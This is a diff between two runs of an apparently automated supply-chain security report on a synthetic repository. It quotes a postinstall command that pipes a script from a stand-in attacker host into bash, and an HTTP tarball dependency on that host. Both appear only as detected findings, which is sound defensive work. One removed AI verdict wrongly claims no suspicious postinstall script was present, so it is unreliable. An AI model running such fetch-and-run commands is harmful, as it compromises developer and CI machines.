@@ -1,7 +1,7 @@
 # Software Supply Chain Guardian: Repository & Change Investigation Report
-**Target Repository:** `C:\Users\yeshx\AppData\Local\Temp\tmpdei6sgoj\synthetic-supply-chain-repo`  
-**Analysis Timestamp:** `2026-11-24T06:55:33.665100+00:00`  
-**Commit Range Investigated:** `379365853b` $\to$ `8b0cf16895`  
+**Target Repository:** `C:\Users\yeshx\AppData\Local\Temp\tmpexrmpn4f\synthetic-supply-chain-repo`  
+**Analysis Timestamp:** `2026-11-24T09:25:58.301861+00:00`  
+**Commit Range Investigated:** `e37ae4042e` $\to$ `2cf872530a`  
 **Total Findings:** 5 (5 introduced in range, 0 pre-existing)  
 **Correlated Multi-Vector Scenarios:** 1  
 **AI Investigations Conducted:** 5  
@@ -12,9 +12,9 @@
 Software Supply Chain Guardian implements an evidence-driven, tool-using investigation pipeline designed to identify malicious, suspicious, and unauthorized software supply chain activities that conventional advisory databases (NVD, CVE, OSV) fail to detect. By analyzing Git commit diffs, manifest changes, lifecycle script commands, external package registries, and CI/CD pipelines, Guardian detects stealthy supply chain attacks and distinguishes them from benign engineering patterns.
 
 ## 2. Investigation Scope and Commit Range
-- **Repository Path:** `C:\Users\yeshx\AppData\Local\Temp\tmpdei6sgoj\synthetic-supply-chain-repo`
-- **Baseline Commit:** `379365853b1aad50138ea26a29ded947b6b022a1`
-- **Head Commit:** `8b0cf16895305e283da762a97f3879afe3a1c9bc`
+- **Repository Path:** `C:\Users\yeshx\AppData\Local\Temp\tmpexrmpn4f\synthetic-supply-chain-repo`
+- **Baseline Commit:** `e37ae4042e40a2ba2fe9e637e3496d26ac0c6291`
+- **Head Commit:** `2cf872530ae49e7b64bec847c639c62e1f0fd8df`
 - **Scanned Files:** Manifests (`package.json`), lockfiles (`package-lock.json`), registry configurations (`.npmrc`), CI/CD workflows (`.github/workflows/*.yml`), and container specifications (`Dockerfile`, `docker-compose.yml`).
 
 ## 3. Methodology
@@ -25,10 +25,10 @@ The investigation combines four complementary analysis layers:
 4. **LangGraph AI Investigator:** An autonomous agent using a bounded read-only tool loop with a strict Grounding Gate to evaluate evidence, test hypotheses, and document mitigating factors.
 
 ## 4. Repository Changes
-- **DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-8b0cf168** (MEDIUM): Manifest Modified Without Updating Lockfile in Commit 8b0cf168 in `package.json` (Line 1)
+- **DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-2cf87253** (MEDIUM): Manifest Modified Without Updating Lockfile in Commit 2cf87253 in `package.json` (Line 1)
 - **DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML** (LOW): Security-Sensitive File Modified: '.github/workflows/ci.yml' (CI/CD Pipeline Definition) in `.github/workflows/ci.yml` (Line 1)
 ## 5. Dependency Changes
-- **DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR** [LOW | Introduced in Range]: Dependency 'core-metrics-collector@http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz' Added in Commit 8b0cf168 (`package.json:8`)
+- **DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR** [LOW | Introduced in Range]: Dependency 'core-metrics-collector@http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz' Added in Commit 2cf87253 (`package.json:8`)
   - *Evidence:* `+ "core-metrics-collector": "http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz"`
 ## 6. Lifecycle-Script Findings
 - **SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13** [CRITICAL]: Suspicious 'postinstall' Script: Lifecycle script pipes remote download directly into shell (`package.json:13`)
@@ -52,37 +52,35 @@ No container configuration weaknesses detected.
   - Manifest 'package.json' defines high-severity install script commands: ['"postinstall": "curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash"'].
 ## 11. AI Investigation Agent Findings (Phase 3 LangGraph Tool-Using Loop)
 ### Investigation: `SCRIPT-PIPE_TO_SHELL-POSTINSTALL-L13`
+- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
+- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
+- **Rationale:** The package.json file explicitly defines a postinstall lifecycle script that executes 'curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash'. This pattern is a classic remote code execution vector common in supply chain attacks, automatically piping arbitrary remote content directly into the shell upon package installation.
+- **Suspected Attack Scenario:** An attacker introduces a malicious 'postinstall' script into the package.json file. When a developer or CI/CD pipeline installs the package (e.g., via npm install), the package manager automatically executes the postinstall script, downloading and executing a remote payload from an untrusted source, leading to complete system compromise or credential theft.
+- **Actionable Remediation:** Immediately remove the malicious postinstall script from package.json, audit the repository and build agents for compromise, and block the affected package version.
+### Investigation: `SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR`
+- **Verdict:** `CONFIRMED_ANOMALY` | **Confidence:** `HIGH`
+- **Planner:** `deterministic` | **Steps Executed:** 1
+- **Rationale:** Configuration in 'package.json' specifies cleartext HTTP or disabled TLS verification, exposing package downloads to network tampering or man-in-the-middle attacks.
+- **Suspected Attack Scenario:** Direct unencrypted transport bypassing TLS integrity and authenticity checks.
+- **Actionable Remediation:** Enforce HTTPS authenticated registries or enforce subresource integrity digests.
+### Investigation: `DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-2cf87253`
 - **Verdict:** `CONFIRMED_ANOMALY` | **Confidence:** `HIGH`
 - **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
-- **Rationale:** The package.json file explicitly defines a postinstall lifecycle script that executes 'curl -fsSL http://cdn.attacker-mirror.internal/setup.sh | bash'. Piping an unauthenticated remote script directly into the shell during package installation is a classic and highly dangerous supply chain attack vector leading to remote code execution.
-- **Suspected Attack Scenario:** An attacker compromises a dependency or submits a malicious pull request introducing a postinstall script that fetches and executes arbitrary remote code. When a developer or CI/CD environment installs the package, the script executes automatically with the user's privileges, exfiltrating environment variables, injecting backdoors, or pivoting within the internal network.
-- **Actionable Remediation:** Immediately remove the malicious 'postinstall' script from package.json, audit all systems where this package version was installed, and revoke any exposed credentials or tokens.
-### Investigation: `SRC-TARBALL-DEP-CORE-METRICS-COLLECTOR`
-- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
-- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
-- **Rationale:** The package.json file explicitly includes a direct URL dependency pointing to an internal/external mirror ('http://cdn.attacker-mirror.internal/dist/metrics-collector-1.0.0.tgz'). Direct tarball or URL dependencies bypass registry checksum validations and allow arbitrary code execution via untrusted remote sources.
-- **Suspected Attack Scenario:** An attacker introduces a direct URL dependency pointing to a controlled mirror containing malicious lifecycle scripts or modified source code, bypassing standard registry integrity checks and executing arbitrary code during package installation.
-- **Actionable Remediation:** Remove the direct URL dependency, pull the package from a trusted verified registry with a pinned cryptographic hash, or replace it with an internally reviewed and approved library.
-### Investigation: `DIFF-INCONSISTENCY-MANIFEST-WITHOUT-LOCK-8b0cf168`
-- **Verdict:** `BENIGN_EXPLANATION` | **Confidence:** `MEDIUM`
-- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
-- **Rationale:** The commit modifies package.json without a corresponding lockfile update, which is a common occurrence during active feature development, incremental dependency testing, or manual version bumps before a formal build step. Without additional malicious indicators such as typosquatting or obfuscated lifecycle scripts, this discrepancy is most likely a routine development artifact rather than a supply chain attack.
-- **Mitigating Factors Identified:**
-  - *Development Workflow Artifact:* Developers frequently edit manifests locally during development or branch iterations before running package managers to regenerate lockfiles.
-  - *Lack of Malicious Indicators:* No suspicious postinstall scripts, external registry redirects, or known typosquatted packages were introduced in the diff.
-- **Actionable Remediation:** Ensure that CI pipelines enforce lockfile synchronization checks (e.g., using 'npm ci' or equivalent strict install commands) to automatically catch and prevent inconsistent manifests from merging into production branches.
-### Investigation: `DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML`
-- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
-- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 2
-- **Rationale:** The workflow modification replaces the standard 'push' trigger with 'pull_request_target', which executes workflow code in the context of the base branch with access to repository secrets and write permissions. Furthermore, the diff shows removal of explicit least-privilege permissions ('contents: read'), leaving the workflow vulnerable to arbitrary code execution attacks via untrusted pull requests.
-- **Suspected Attack Scenario:** An attacker submits a malicious pull request containing modified code or exploiting project build scripts. Because the workflow triggers on 'pull_request_target' and lacks restrictive permissions, the malicious code runs with access to sensitive repository secrets and repository write permissions, enabling secrets exfiltration, repository tampering, or supply chain compromise.
-- **Actionable Remediation:** Immediately revert the changes to '.github/workflows/ci.yml' to remove 'pull_request_target', reinstate strict least-privilege permissions, and audit repository secrets for unauthorized access.
+- **Rationale:** The repository commit diff confirms that package.json was modified without a corresponding update to the project's lockfile. This creates a state of dependency drift and inconsistency, which can lead to non-deterministic builds and potential supply chain vulnerabilities if dependency resolution diverges across environments.
+- **Suspected Attack Scenario:** An attacker or developer introduces modified dependency constraints in package.json without committing lockfile updates, potentially forcing downstream builds to resolve different, untrusted dependency versions or malicious packages via stale lockfile states.
+- **Actionable Remediation:** Run the appropriate package manager install command (e.g., npm install or yarn install) to regenerate and commit the updated lockfile matching the new package.json.
 ### Investigation: `DIFF-DEP-ADDED-CORE-METRICS-COLLECTOR`
 - **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
-- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 2
-- **Rationale:** The package.json file was modified to pull a dependency directly from an internal URL containing suspicious nomenclature ('attacker-mirror.internal') rather than a trusted public registry or verified private feed. This is a classic indicator of a supply chain injection attempt aiming to fetch a modified or malicious package archive directly over HTTP.
-- **Suspected Attack Scenario:** An attacker introduces an unauthorized dependency reference pointing to an external or controlled mirror URL within the package.json file to execute arbitrary installation scripts or inject malicious code during the build/dependency resolution phase.
-- **Actionable Remediation:** Immediately revert commit 8b0cf168, block network access to the suspicious mirror domain, and audit all systems that may have processed this package version.
+- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
+- **Rationale:** The dependency 'core-metrics-collector' is added to package.json pointing directly to an external HTTP URL on an internal attacker-controlled domain ('cdn.attacker-mirror.internal'). This is a clear indicator of dependency confusion, supply chain injection, or out-of-band artifact retrieval which bypasses standard secure package registry verification.
+- **Suspected Attack Scenario:** An attacker introduces a malicious package dependency fetched via an unencrypted HTTP URL from an attacker-controlled mirror or staging server. When 'npm install' or a similar package manager command runs, it pulls the tarball directly from the malicious domain, executing arbitrary code or embedding compromised source artifacts into the build pipeline.
+- **Actionable Remediation:** Immediately remove the dependency referencing the external mirror, audit lockfiles and build environments for unauthorized artifact execution, and restrict dependency sources to approved secure registries.
+### Investigation: `DIFF-SENSITIVE-FILE-_GITHUB_WORKFLOWS_CI_YML`
+- **Verdict:** `SUSPECTED_SUPPLY_CHAIN_ATTACK` | **Confidence:** `HIGH`
+- **Planner:** `llm:gemini:gemini-3.5-flash-lite` | **Steps Executed:** 1
+- **Rationale:** The workflow modification changes the trigger from `push` to `pull_request_target`. In GitHub Actions, `pull_request_target` runs in the context of the base branch and has access to repository secrets, and when combined with checking out PR code or running untrusted scripts from the PR, it introduces a severe remote code execution (RCE) vector.
+- **Suspected Attack Scenario:** An attacker submits a malicious pull request containing modified code or build scripts. Because the workflow uses `pull_request_target`, the CI pipeline executes the PR's untrusted code or build steps with elevated permissions and access to repository secrets, allowing the attacker to exfiltrate secrets or compromise the repository.
+- **Actionable Remediation:** Revert the workflow trigger back to 'push' or 'pull_request', and ensure that untrusted PR code is never checked out or executed within privileged workflow contexts.
 ## 12. False-Positive Considerations
 - **Lexical Similarities vs Intentional Polyfills:** Package names like `bcrypt-nodejs` share similarity with `bcrypt`, but investigation confirms legitimate engineering intent (pure-JS implementation avoiding native C++ toolchain errors).
 - **Internal Private Registries:** Registries hosted on corporate networks are authenticated and safe when TLS (`strict-ssl=true`) is enforced.
